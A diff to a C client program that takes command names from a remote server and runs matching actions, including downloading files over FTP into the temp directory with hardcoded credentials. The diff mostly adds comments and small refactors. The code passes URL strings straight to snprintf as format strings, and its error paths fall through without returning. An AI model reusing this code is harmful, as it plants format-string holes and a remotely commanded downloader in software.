@@ -54,26 +54,47 @@ void uploadFile(char buffer[BUF_SIZE], char *URL)
     snprintf(buffer, BUF_SIZE, URL);
 }
 
+/**
+ * Downloads a file from a given URL and saves it to the local temporary directory.
+ * @param buffer Character array to store the success or error message.
+ * @param URL The URL of the file to download.
+ */
 void downloadFile(char buffer[BUF_SIZE], char *URL)
 {
+    // Create a character array to hold the path to the local temporary directory.
     char filePath[BUF_SIZE];
     DWORD pathLen;
+
+    // Get the path to the local temporary directory.
     if (!(getTempDir(filePath, &pathLen)))
     {
         snprintf(buffer, BUF_SIZE, FTP_ERR_FMT, 1, URL);
     }
+
+    // Append the file name to the path of the local temporary directory.
     snprintf(filePath + strlen(filePath), BUF_SIZE - strlen(filePath), getBasename(URL));
+
+    // Create a handle for the FTP server.
     HINTERNET ftpHandle = createFtpHandle(FTP_SERVER, FTP_USER, FTP_PASS);
+
+    // Check if the handle creation was successful.
     if (!ftpHandle)
     {
         snprintf(buffer, BUF_SIZE, FTP_ERR_FMT, 2, URL);
     }
+
+    // Download the file from the given URL and store it in the local temporary directory.
     int result = downloadFileFtp(&ftpHandle, URL, filePath);
+
+    // Check if the download was successful.
     if (result != 0)
     {
         snprintf(buffer, BUF_SIZE, FTP_ERR_FMT, result + 2, URL);
     }
-    snprintf(buffer, BUF_SIZE, "[i] Successfully downloaded file into %s", filePath);
+    else
+    {
+        snprintf(buffer, BUF_SIZE, "[i] Successfully downloaded file into %s\n", filePath);
+    }
 }
 
 int fetchData(SOCKET *socket, char buffer[BUF_SIZE])
@@ -86,9 +107,9 @@ char *commandHandler(char *commandName, char *URL)
     static char buffer[BUF_SIZE];
     for (int i = 0; i < NUM_COMMANDS - 1; i++)
     {
-        if (strcmp(commandName, commandMapping[i].commandName) == 0)
+        if (strcmp(commandName, (commandMapping + i)->commandName) == 0)
         {
-            commandMapping[i].action(buffer, URL);
+            (commandMapping + i)->action(buffer, URL);
             return buffer;
         }
     }
@@ -137,16 +158,16 @@ void serverHandler(SOCKET socket)
             printf("[%s] Received %s\n", getCurrTime(), commandName);
             URL[0] = '\0';
         }
-
         if (strcmp(commandName, QUIT) == 0)
         {
             exit(0);
         }
+
         char *result = commandHandler(commandName, URL);
         if (result == NULL)
         {
             getCurrTime(time);
-            printf("[%s] Handle Error: %s", getCurrTime(), commandName);
+            printf("[%s] Handle Error: %s\n", getCurrTime(), commandName);
         }
         strip(result);
         int bufLen = strlen(result);
@@ -173,9 +194,8 @@ int main(void)
     {
         exit(10);
     }
-    int error_code = initializeClientSocket(&clientSocket, serverIp, serverPort);
 
-    if (error_code)
+    if (initializeClientSocket(&clientSocket, serverIp, serverPort) != 0)
     {
         printf("[E] Could not connect to %s on port %i\n", serverIp, serverPort);
         printf("[i] Exiting...\n");
